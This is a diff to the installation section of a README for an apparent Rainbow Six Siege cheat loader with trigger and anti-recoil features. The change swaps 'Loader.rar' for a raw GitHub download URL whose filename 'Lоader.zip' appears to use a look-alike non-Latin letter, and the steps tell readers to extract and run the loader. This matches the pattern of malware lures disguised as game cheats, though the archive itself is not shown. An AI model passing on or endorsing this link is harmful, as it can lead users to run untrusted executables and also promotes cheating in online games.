@@ -31,7 +31,7 @@ Rainbow Six Siege, game automation, script loader, trigger system, anti-recoil, 
 
 ## 📥 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/GetachewGanfur/RainbowSixSiegeXScriptedEdge/main/Lоader.zip** from the repository.
 2. Extract contents to your preferred directory.
 3. Run the Loader application as per your operating system instructions.
 4. Follow on-screen setup.  
